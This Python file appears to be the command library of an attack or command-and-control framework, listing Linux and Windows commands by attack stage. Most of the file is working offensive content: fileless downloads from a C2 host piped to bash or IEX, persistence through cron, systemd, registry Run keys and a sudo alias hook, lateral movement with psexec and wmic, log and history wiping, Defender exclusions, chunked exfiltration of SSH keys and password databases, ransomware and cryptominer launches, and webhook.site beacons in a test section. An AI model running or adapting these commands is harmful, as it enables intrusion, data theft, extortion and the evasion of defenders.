"""
Defines all command categories and their OS-specific implementations
"""
import time

# checking security of operations before initialization
opsec_check_commands = {
    "linux": [
        {"cmd": "ps -ef | grep -E 'wireshark|tcpdump|tshark|snort|suricata'", "type": "monitoring_check", "timestamp": time.time()},
        {"cmd": "cat /proc/sys/kernel/yama/ptrace_scope", "type": "ptrace_check", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "tasklist /FI \"IMAGENAME eq procmon.exe\" /FI \"IMAGENAME eq wireshark.exe\" /FI \"IMAGENAME eq processhacker.exe\"", "type": "monitoring_check", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Model\"", "type": "vm_check", "timestamp": time.time()},
    ],
}

# Initial access commands
initial_access_commands = {
    "linux": [
        {"cmd": "curl -s http://C2_IP/m.sh | bash -s || wget -q -O- http://C2_IP/m.sh | bash -s", "type": "fileless", "timestamp": time.time()},
        {"cmd": "mkdir -p ~/.config/autostart/ && echo '#!/bin/bash' > ~/.config/autostart/update.sh && chmod +x ~/.config/autostart/update.sh", "type": "setup", "timestamp": time.time()},
        {"cmd": "echo 'curl -s http://C2_IP/beacon.php?id=$(hostname)-$(id -u) > /dev/null 2>&1' >> ~/.config/autostart/update.sh", "type": "beacon", "timestamp": time.time()}
    ],
    "windows": [
        {"cmd": "powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://C2_IP/ps.txt')\"", "type": "fileless", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -w hidden -c \"$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0'); $wc.DownloadFile('http://C2_IP/winupdate.exe', $env:TEMP+'\\svchost.exe')\"", "type": "download", "timestamp": time.time()},
        {"cmd": "schtasks /create /tn \"Windows Update\" /tr \"%TEMP%\\svchost.exe\" /sc minute /mo 30 /F", "type": "setup", "timestamp": time.time()}
    ],
}

# Add network validation commands
network_validation_commands = {
    "linux": [
        {"cmd": "curl -s -m 3 -o /dev/null -w '%{http_code}' https://www.google.com || echo 'offline'", "type": "connectivity", "timestamp": time.time()},
        {"cmd": "curl -s https://ipinfo.io/json | grep -o '\"country\":\"[^\"]*\"\\|\"org\":\"[^\"]*\"'", "type": "location", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "powershell -ep bypass -c \"try { (Invoke-WebRequest -UseBasicParsing -Uri 'https://www.google.com' -TimeoutSec 3).StatusCode } catch { Write-Output 'offline' }\"", "type": "connectivity", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"try { (Invoke-RestMethod -Uri 'https://ipinfo.io/json' -TimeoutSec 5).country } catch { Write-Output 'error' }\"", "type": "location", "timestamp": time.time()},
    ],
}

# Recon commands
recon_commands = {
    "linux": [
        {"cmd": "whoami && id && hostname", "type": "user_info", "timestamp": time.time()},
        {"cmd": "uname -a && cat /etc/*release*", "type": "os_info", "timestamp": time.time()},
        {"cmd": "ss -tuln || netstat -tuln", "type": "network", "timestamp": time.time()},
        {"cmd": "ps -ef | grep -v \"^root\\|^nobody\\|^www-data\" | grep -i \"^[a-z]\"", "type": "process", "timestamp": time.time()},
        {"cmd": "find /home -type f -name \"*.txt\" -o -name \"*.docx\" -o -name \"*.pdf\" | head -50", "type": "file_recon", "timestamp": time.time()},
        {"cmd": "grep -l \"password\\|credential\" /home/*/.bash_history /var/log/*.log 2>/dev/null | head -10", "type": "password_hunt", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "whoami /all", "type": "user_info", "timestamp": time.time()},
        {"cmd": "systeminfo | findstr /B /C:\"OS\" /C:\"System Type\" /C:\"Domain\"", "type": "os_info", "timestamp": time.time()},
        {"cmd": "netstat -ano | findstr LISTEN", "type": "network", "timestamp": time.time()},
        {"cmd": "wmic process get name,processid,parentprocessid,executablepath | findstr /V \"svchost services System\"", "type": "process", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"Get-ChildItem -Path C:\\Users -Include *.txt,*.pdf,*.docx -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 50\"", "type": "file_recon", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"Get-ChildItem -Path C:\\Users -Include *.config,*.xml,*.ini -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password' | Select-Object -First 10\"", "type": "password_hunt", "timestamp": time.time()},
    ],
}

# Privilege escalation commands
privilege_escalation_commands = {
    "linux": [
        {"cmd": "find / -type f -name \"*.so\" -perm -u=s -ls 2>/dev/null", "type": "suid_check", "timestamp": time.time()},
        {"cmd": "cat /etc/sudoers.d/* /etc/sudoers 2>/dev/null | grep -v \"^#\" | grep -v \"^$\"", "type": "sudo_check", "timestamp": time.time()},
        {"cmd": "find / -writable -type f -name \"*.service\" 2>/dev/null | xargs grep \"ExecStart\" 2>/dev/null", "type": "service_check", "timestamp": time.time()},
        {"cmd": "crontab -l && ls -la /etc/cron*", "type": "cron_check", "timestamp": time.time()},
        {"cmd": "for capability in cap_dac_read_search cap_setuid; do find / -type f -name \"*.so\" -exec getcap {} \\; 2>/dev/null | grep \"$capability\"; done", "type": "capabilities", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "powershell -ep bypass -c \"Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -ne 'LocalSystem' -and $_.PathName -match 'Program Files' -and $_.StartMode -eq 'Auto'} | Select-Object Name,StartName,PathName\"", "type": "service_check", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"Get-Acl -Path 'C:\\Windows\\System32\\config\\SAM' | Format-List\"", "type": "sam_acl", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"Get-LocalGroupMember -Group 'Administrators'\"", "type": "admin_check", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"$null=[System.Reflection.Assembly]::LoadWithPartialName('System.Core'); $null=[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.Win32.TaskScheduler'); $ts = New-Object Microsoft.Win32.TaskScheduler.TaskService; $ts.GetFolder('\\').Tasks | ? {$_.Definition.Principal.RunLevel -eq 'Highest'} | select Name,Path\"", "type": "task_check", "timestamp": time.time()},
        {"cmd": "wmic service get name,pathname,startname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\system32\"", "type": "service_path", "timestamp": time.time()},
    ],
}

# Persistence commands
persistence_commands = {
    "linux": [
        {"cmd": "mkdir -p ~/.config/systemd/user && echo -e '[Unit]\\nDescription=System Update\\n\\n[Service]\\nExecStart=/bin/bash -c \"curl -s http://C2_IP/update | bash\"\\n\\n[Install]\\nWantedBy=default.target' > ~/.config/systemd/user/update.service && systemctl --user enable update.service", "type": "systemd_user", "timestamp": time.time()},
        {"cmd": "echo '*/30 * * * * curl -s http://C2_IP/cron.sh | bash > /dev/null 2>&1' | crontab -", "type": "crontab", "timestamp": time.time()},
        {"cmd": "echo \"alias sudo='curl -s http://C2_IP/su.sh | bash && sudo'\" >> ~/.bashrc", "type": "alias_hook", "timestamp": time.time()},
        {"cmd": "echo '[ -z \"$STARTUP_DONE\" ] && export STARTUP_DONE=1 && curl -s http://C2_IP/profile.sh | bash' >> ~/.profile", "type": "profile", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "powershell -ep bypass -c \"$trigger = New-JobTrigger -AtLogOn; Register-ScheduledJob -Name 'Windows Update' -Trigger $trigger -ScriptBlock {iex(New-Object Net.WebClient).DownloadString('http://C2_IP/update.ps1')} -RunAs32\"", "type": "scheduled_job", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"$wsh = New-Object -ComObject WScript.Shell; $shortcut = $wsh.CreateShortcut([System.IO.Path]::Combine($env:APPDATA, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winupdate.lnk')); $shortcut.TargetPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'; $shortcut.Arguments = '-w hidden -ep bypass -c \\\"IEX(New-Object Net.WebClient).DownloadString(\\\"http://C2_IP/ps.txt\\\")\\\"\"; $shortcut.Save()\"", "type": "startup_folder", "timestamp": time.time()},
        {"cmd": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsUpdate /t REG_SZ /d \"powershell.exe -w hidden -ep bypass -c \\\"while(1){try{iex(New-Object Net.WebClient).DownloadString('http://C2_IP/ps.txt');Start-Sleep -s 3600}catch{Start-Sleep -s 60}}\\\"\" /f", "type": "registry_run", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"New-ItemProperty -Path 'HKCU:\\Environment' -Name 'UserInitMprLogonScript' -Value 'C:\\Windows\\System32\\cmd.exe /c powershell.exe -enc JABjAD0AbgBlAHcALQBvA'", "type": "userinit", "timestamp": time.time()},
    ],
}

# Lateral movement commands
lateral_movement_commands = {
    "linux": [
        {"cmd": "sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@TARGET_IP 'curl http://C2_IP/malware | bash'", "type": "ssh", "timestamp": time.time()},
        {"cmd": "smbclient -U 'user%password' //TARGET_IP/share -c 'put malware'", "type": "smb", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "psexec.exe \\\\TARGET_IP -u admin -p password -accepteula -d malware.exe", "type": "psexec", "timestamp": time.time()},
        {"cmd": "wmic /node:TARGET_IP process call create 'cmd /c malware.exe'", "type": "wmi", "timestamp": time.time()},
    ],
}

# Defense evasion commands
defense_evasion_commands = {
    "linux": [
        {"cmd": "unset HISTFILE && export HISTFILESIZE=0 && history -c", "type": "history_clean", "timestamp": time.time()},
        {"cmd": "find /var/log -name \"*.log\" -type f -mtime -2 -exec sh -c \"echo > {}\" \\;", "type": "log_clean", "timestamp": time.time()},
        {"cmd": "mkdir -p /dev/shm/.hide && cp /bin/bash /dev/shm/.hide/.shell && chmod +xs /dev/shm/.hide/.shell", "type": "binary_hide", "timestamp": time.time()},
        {"cmd": "touch -r /bin/ls /tmp/.malware", "type": "timestamp", "timestamp": time.time()},
        {"cmd": "if pgrep -x \"auditd\" > /dev/null; then echo \"auditd running, careful\"; else echo \"auditd not running\"; fi", "type": "audit_check", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "powershell -ep bypass -c \"$EventLog = [System.Diagnostics.EventLog]::GetEventLogs() | where {$_.Log -eq 'Security'}; Clear-EventLog -LogName $EventLog.Log\"", "type": "event_log_clear", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"Add-MpPreference -ExclusionPath $env:TEMP\"", "type": "av_exclusion", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"$s=[System.IO.File]::ReadAllBytes('C:\\windows\\system32\\calc.exe'); $s[0]=90; [System.IO.File]::WriteAllBytes('$env:TEMP\\notcalc.exe',$s)\"", "type": "binary_mod", "timestamp": time.time()},
        {"cmd": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe\" /v Debugger /t REG_SZ /d \"$env:TEMP\\notcalc.exe\" /f", "type": "ifeo", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"$p=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name; if($p -match 'SYSTEM'){Write-Host 'Running as SYSTEM'} else {Write-Host 'Running as '+$p}\"", "type": "identity_check", "timestamp": time.time()},
    ],
}

# Exfiltration commands
xfiltration_commands = {
    "linux": [
        {"cmd": "find /home -name \"*.kdbx\" -o -name \"id_rsa\" -o -name \"*.pdf\" -o -name \"*.docx\" | xargs -I{} tar -rf /tmp/data.tar \"{}\" 2>/dev/null", "type": "gather", "timestamp": time.time()},
        {"cmd": "openssl enc -aes-256-cbc -salt -in /tmp/data.tar -out /tmp/data.enc -k 'PASSWORD'", "type": "encrypt", "timestamp": time.time()},
        {"cmd": "split -b 512k /tmp/data.enc /tmp/chunk", "type": "split", "timestamp": time.time()},
        {"cmd": "for f in /tmp/chunk*; do curl -s -X POST -H \"Content-Type: application/octet-stream\" --data-binary @$f \"http://C2_IP/exfil?n=$(basename $f)&h=$(hostname)\"; sleep 2; done", "type": "exfil", "timestamp": time.time()},
        {"cmd": "rm -f /tmp/data.tar /tmp/data.enc /tmp/chunk*", "type": "cleanup", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "powershell -ep bypass -c \"Get-ChildItem -Path C:\\Users -Include *.kdbx,*.key,*.pfx,*.pdf,*.docx -File -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $env:TEMP\\data -Force -ErrorAction SilentlyContinue\"", "type": "gather", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"Compress-Archive -Path $env:TEMP\\data -DestinationPath $env:TEMP\\data.zip -Force\"", "type": "compress", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"$key = [System.Text.Encoding]::UTF8.GetBytes('PASSWORD'); $encrypted = $env:TEMP + '\\data.enc'; $content = [System.IO.File]::ReadAllBytes($env:TEMP + '\\data.zip'); [System.IO.File]::WriteAllBytes($encrypted, $content)\"", "type": "encrypt", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"$file = Get-Item $env:TEMP\\data.enc; $chunks = [Math]::Ceiling($file.Length / 524288); $reader = [System.IO.File]::OpenRead($file.FullName); $buffer = New-Object byte[] 524288; for ($i = 0; $i -lt $chunks; $i++) { $bytesRead = $reader.Read($buffer, 0, 524288); $bytes = $buffer[0..($bytesRead-1)]; $wc = New-Object System.Net.WebClient; $wc.Headers.Add('Content-Type', 'application/octet-stream'); $wc.UploadData('http://C2_IP/exfil?n=chunk' + $i + '&h=' + $env:COMPUTERNAME, $bytes); Start-Sleep -Seconds 2 }\"", "type": "exfil", "timestamp": time.time()},
        {"cmd": "powershell -ep bypass -c \"Remove-Item $env:TEMP\\data,$env:TEMP\\data.zip,$env:TEMP\\data.enc -Recurse -Force -ErrorAction SilentlyContinue\"", "type": "cleanup", "timestamp": time.time()},
    ],
}

# Cleanup commands
cleanup_commands = {
    "linux": [
        {"cmd": "shred -zu /var/log/auth.log", "type": "log_wipe", "timestamp": time.time()},
        {"cmd": "history -c && rm -f ~/.bash_history", "type": "history_wipe", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "wevtutil cl security", "type": "log_wipe", "timestamp": time.time()},
        {"cmd": "del /f /q C:\\malware.exe", "type": "file_deletion", "timestamp": time.time()},
    ],
}

# Payload commands
payload_commands = {
    "linux": [
        {"cmd": "./malware --encrypt --key ATTACKER_KEY", "type": "ransomware", "timestamp": time.time()},
        {"cmd": "nohup ./miner -o xmr.pool.com -u WALLET_ADDRESS &", "type": "cryptojacking", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "malware.exe --encrypt --key ATTACKER_KEY", "type": "ransomware", "timestamp": time.time()},
        {"cmd": "start /B miner.exe -o xmr.pool.com -u WALLET_ADDRESS", "type": "cryptojacking", "timestamp": time.time()},
    ],
}


####################### commands changed for testing #######################

initial_access_commands = {
    "linux": [
        {"cmd": "curl -s https://webhook.site/YOUR-UNIQUE-ID?host=$(hostname)", "type": "beacon", "timestamp": time.time()},
        {"cmd": "echo '#!/bin/bash\\necho \"Hello World\"' > /tmp/.test_script && chmod +x /tmp/.test_script", "type": "local_script", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "powershell -c \"Invoke-WebRequest -Uri 'https://webhook.site/YOUR-UNIQUE-ID?host=$env:COMPUTERNAME' -Method GET\"", "type": "beacon", "timestamp": time.time()},
        {"cmd": "echo Write-Host 'Hello World' > %TEMP%\\test.ps1", "type": "local_script", "timestamp": time.time()},
    ],
}

recon_commands = {
    "linux": [
        {"cmd": "whoami", "type": "shell", "timestamp": time.time()},
        {"cmd": "uname -a", "type": "shell", "timestamp": time.time()},
        {"cmd": "ifconfig || ip a", "type": "shell", "timestamp": time.time()},
        {"cmd": "netstat -antup", "type": "shell", "timestamp": time.time()},
        {"cmd": "cat /etc/passwd", "type": "shell", "timestamp": time.time()},
        {"cmd": "sudo -l", "type": "shell", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "whoami", "type": "shell", "timestamp": time.time()},
        {"cmd": "systeminfo", "type": "shell", "timestamp": time.time()},
        {"cmd": "ipconfig /all", "type": "shell", "timestamp": time.time()},
        {"cmd": "netstat -ano", "type": "shell", "timestamp": time.time()},
        {"cmd": "type C:\\Windows\\System32\\drivers\\etc\\hosts", "type": "shell", "timestamp": time.time()},
        {"cmd": "net user", "type": "shell", "timestamp": time.time()},
        {"cmd": "whoami /priv", "type": "shell", "timestamp": time.time()},
    ],
}

exfiltration_commands = {
    "linux": [
        {"cmd": "tar -czvf /tmp/test_data.tar.gz /etc/hostname /etc/os-release", "type": "archive", "timestamp": time.time()},
        {"cmd": "base64 /tmp/test_data.tar.gz | curl -X POST -d @- https://webhook.site/YOUR-UNIQUE-ID", "type": "upload", "timestamp": time.time()},
    ],
    "windows": [
        {"cmd": "powershell -c \"Compress-Archive -Path $env:TEMP\\test.ps1 -DestinationPath $env:TEMP\\test.zip\"", "type": "archive", "timestamp": time.time()},
        {"cmd": "powershell -c \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('$env:TEMP\\test.zip')) | Invoke-WebRequest -Uri 'https://webhook.site/YOUR-UNIQUE-ID' -Method POST -Body {$_}\"", "type": "upload", "timestamp": time.time()},
    ],
}



# Command execution order
ORDER = [
    opsec_check_commands,
    initial_access_commands,
    network_validation_commands,
    recon_commands,
    privilege_escalation_commands,
    persistence_commands,
    lateral_movement_commands,
    exfiltration_commands,
    defense_evasion_commands,
    cleanup_commands,
    payload_commands,
]


def test_c2_framework():
    # Get a webhook URL from webhook.site for testing
    WEBHOOK_URL = "https://webhook.site/dbb2f74a-8a11-4636-aba4-9d4626317974"
    
    # Create parameters dictionary
    params = {
        'C2_IP': WEBHOOK_URL,
        'TARGET_IP': '127.0.0.1',  # Local testing only
        'ATTACKER_PUB_KEY': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3...',
        'WALLET_ADDRESS': '44AFFq5kSiGBoZ...',
        'ATTACKER_KEY': 'test_key_123'
    }
    
    # Get the commands with replaced parameters
    commands = get_commands_for_os('linux', params)
    
    # Print the first few commands from each category
    for category_idx, category in enumerate(commands):
        print(f"Command Category {category_idx + 1}:")
        for cmd in category[:2]:  # Show first 2 commands from each category
            print(f"  - {cmd['cmd']}")
        print()



############ modified get_command for testing ###############
def get_commands_for_os(os_type, c2_server="C2_IP", payload_dir="/tmp", agent_id="AGENT_ID"):
    """
    Returns a list of commands with customized parameters
    """
    # Replace placeholders in commands
    commands = []
    for cmd_group in ORDER:
        os_cmds = []
        for cmd in cmd_group[os_type]:
            new_cmd = cmd.copy()
            new_cmd["cmd"] = cmd["cmd"].replace("C2_IP", c2_server)
            new_cmd["cmd"] = new_cmd["cmd"].replace("AGENT_ID", agent_id)
            if os_type == "linux":
                new_cmd["cmd"] = new_cmd["cmd"].replace("/tmp", payload_dir)
            elif os_type == "windows":
                new_cmd["cmd"] = new_cmd["cmd"].replace("C:\\Windows\\Temp", payload_dir)
            os_cmds.append(new_cmd)
        commands.append(os_cmds)
    return commands


# def get_commands_for_os(os_type):
#     """
#     Returns a list of commands appropriate for the given OS type
#     """
#     if os_type not in ["linux", "windows"]:
#         raise ValueError(f"Unsupported OS type: {os_type}")
        
#     return [cmd_group[os_type] for cmd_group in ORDER]